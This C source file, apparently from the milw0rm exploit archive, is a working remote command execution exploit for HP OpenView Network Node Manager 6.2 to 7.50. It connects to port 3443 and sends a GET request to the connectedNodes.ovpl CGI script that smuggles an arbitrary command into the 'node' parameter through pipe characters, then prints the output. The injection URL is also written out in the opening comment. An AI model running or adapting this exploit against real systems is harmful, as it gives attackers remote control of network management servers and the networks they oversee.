/*
Web Browser info:
	/OvCgi/connectedNodes.ovpl?node=a|command|
	/str0ke
*/

/*
##################################################################################
# HP OpenView Network Node Manager 6.2, 6.4, 7.01, 7.50 Remote Command Execution #
##################################################################################

Name: HP OV NNM Remote Command Execution Exploit
File: HP_OV_NNM_RCE.c
Description: Exploit
Author: Lympex
Contact:
+ Web: http://l-bytes.net
+ Mail: lympex[at]gmail[dot]com
Date: 30/08/2005
Extra: Compiled with Visual C++ 6.0

############################################################################
#SecurityTracker Alert ID:  1014791                                        #
#SecurityTracker URL:  http://securitytracker.com/id?1014791               #
#CVE Reference:  GENERIC-MAP-NOMATCH                                       #
#Updated:  Aug 25 2005                                                     #
#Original Entry Date:  Aug 25 2005                                         #
#Impact:  Execution of arbitrary code via network, User access via network #
############################################################################

*/

//headers
#include <stdio.h>//In/Out
#include <winsock2.h>//sockets functions
#include <stdlib.h>//memory functions
#include <string.h>//strlen,strcat,strcpy

#pragma comment(lib,"ws2_32.lib") //for compile with dev-c++ link to "libws2_32.lib"

#define Port 3443 //port for connect to HP OV NNM
#define SIZE 2048 //buffer size to receive the data

/*connect host:port*/
SOCKET Conecta(char *Host, short puerto)
{
	/*struct for make the socket*/
	WSADATA wsaData;
	SOCKET Winsock;//listener socket
	/*two structures for connect*/
	struct sockaddr_in Winsock_In;
	struct hostent *Ip;

	/*start the socket*/
	WSAStartup(MAKEWORD(2,2), &wsaData);
	/*make*/
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

	//check socket status
	if(Winsock==INVALID_SOCKET)
	{
		/*exit*/
		WSACleanup();
		return -1;
	}

	/*complete the struct*/
	Ip=gethostbyname(Host);
	Winsock_In.sin_port=htons(puerto);
	Winsock_In.sin_family=AF_INET;
	Winsock_In.sin_addr.s_addr=inet_addr(inet_ntoa(*((struct in_addr *)Ip->h_addr)));

	/*connect*/
	if(WSAConnect(Winsock,(SOCKADDR*)&Winsock_In,sizeof(Winsock_In),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
	{
		/*end*/
		WSACleanup();
		return -1;
	}

	return Winsock;
}

/*MASTER FUNCTION*/
int main(int argc, char *argv[])
{
	/*the socket*/
	SOCKET sock;
	/*make the evil buffer to send the request*/
	char evil_request[]="GET /OvCgi/connectedNodes.ovpl?node=a| ";
	char evil_request2[]=" |";
	char *evil;
	/*to receive the data*/
	char buf[SIZE];
	unsigned int i;

	printf("\n +[ HP OV NNM Remote Command Execution ]+ by Lympex");
    printf("\nContact: lympex[at]gmail[dot]com & http://l-bytes.net");
	printf("\n-----------------------------------------------------\n");

	if(argc!=3)//HP_OV_NNM_RCE <host> <command>
	{
		printf("\n[+] Usage: %s <host> <command>",argv[0]);
		printf("\nImportant: Do not include \x22<\x22 and \x22>\x22 chars\n");
		return 0;
	}

	for(i=0;i<strlen(argv[2]);i++)
	{
		if(argv[2][i]=='<' || argv[2][i]=='>')
		{
			printf("\n[!] Error - You have included \x22<\x22 and/or \x22>\x22 chars\n");
			return 1;
		}
	}

	printf("\n[+] Connecting  %s:%d...",argv[1],Port);

	/*start the exploit*/
	sock=Conecta(argv[1],Port);//connect
	if(sock==-1)
	{
		printf("Error\n");
		return 1;
	}

	printf("OK");

	/*make the EVIL request*/
	evil=(char *) malloc((strlen(argv[2])+24+12)*sizeof(char));
	strcpy(evil,evil_request);strcat(evil,argv[2]);strcat(evil,evil_request2);strcat(evil,"\n\n");

	//sends it
	send(sock,evil,strlen(evil),0);

	buf[recv(sock,buf,SIZE,0)]='\0';

	//show the data
	printf("\n\n------- [Result] -------\n\n%s\n------- [/Result] -------\n",buf);

	WSACleanup();
	LocalFree(buf);
	LocalFree(evil);
	return 0;
}

// milw0rm.com [2005-08-30]
